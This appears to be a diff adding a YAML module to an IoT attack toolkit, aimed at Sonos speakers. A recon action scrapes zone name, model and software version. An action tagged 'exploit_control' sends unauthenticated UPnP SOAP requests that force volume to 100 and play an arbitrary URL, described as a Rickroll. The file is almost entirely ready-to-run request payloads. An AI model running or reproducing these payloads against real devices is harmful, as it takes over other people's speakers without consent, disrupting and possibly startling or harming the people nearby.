@@ -1,0 +1,81 @@
+id: sonos
+device_type: speaker
+vendor: Sonos
+family: sonos
+requires:
+  port: 1400
+actions:
+  - id: dump-info
+    label: "Dump zone / group info"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:1400/xml/device_description.xml"
+          save_as: dd
+      - extract:
+          from: $dd
+          fields:
+            zoneName: '<roomName>([^<]+)</roomName>'
+            model: '<modelName>([^<]+)</modelName>'
+            softwareVersion: '<softwareVersion>([^<]+)</softwareVersion>'
+
+  - id: play-url
+    label: "Play arbitrary URL at max volume (Rickroll)"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "This will interrupt the speaker's playback."
+    steps:
+      - note: "Sets volume to 100 then plays URL via AVTransport SetAVTransportURI"
+      - http_request:
+          url: "http://{{target.ip}}:1400/MediaRenderer/RenderingControl/Control"
+          method: POST
+          headers:
+            Content-Type: 'text/xml; charset="utf-8"'
+            SOAPACTION: '"urn:schemas-upnp-org:service:RenderingControl:1#SetVolume"'
+          body: |
+            <?xml version="1.0" encoding="utf-8"?>
+            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+              <s:Body>
+                <u:SetVolume xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1">
+                  <InstanceID>0</InstanceID>
+                  <Channel>Master</Channel>
+                  <DesiredVolume>100</DesiredVolume>
+                </u:SetVolume>
+              </s:Body>
+            </s:Envelope>
+          timeout: 5
+      - http_request:
+          url: "http://{{target.ip}}:1400/MediaRenderer/AVTransport/Control"
+          method: POST
+          headers:
+            Content-Type: 'text/xml; charset="utf-8"'
+            SOAPACTION: '"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"'
+          body: |
+            <?xml version="1.0" encoding="utf-8"?>
+            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+              <s:Body>
+                <u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
+                  <InstanceID>0</InstanceID>
+                  <CurrentURI>x-file-cifs://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4</CurrentURI>
+                  <CurrentURIMetaData></CurrentURIMetaData>
+                </u:SetAVTransportURI>
+              </s:Body>
+            </s:Envelope>
+          timeout: 5
+      - http_request:
+          url: "http://{{target.ip}}:1400/MediaRenderer/AVTransport/Control"
+          method: POST
+          headers:
+            Content-Type: 'text/xml; charset="utf-8"'
+            SOAPACTION: '"urn:schemas-upnp-org:service:AVTransport:1#Play"'
+          body: |
+            <?xml version="1.0" encoding="utf-8"?>
+            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+              <s:Body>
+                <u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
+                  <InstanceID>0</InstanceID><Speed>1</Speed>
+                </u:Play>
+              </s:Body>
+            </s:Envelope>
+          timeout: 5
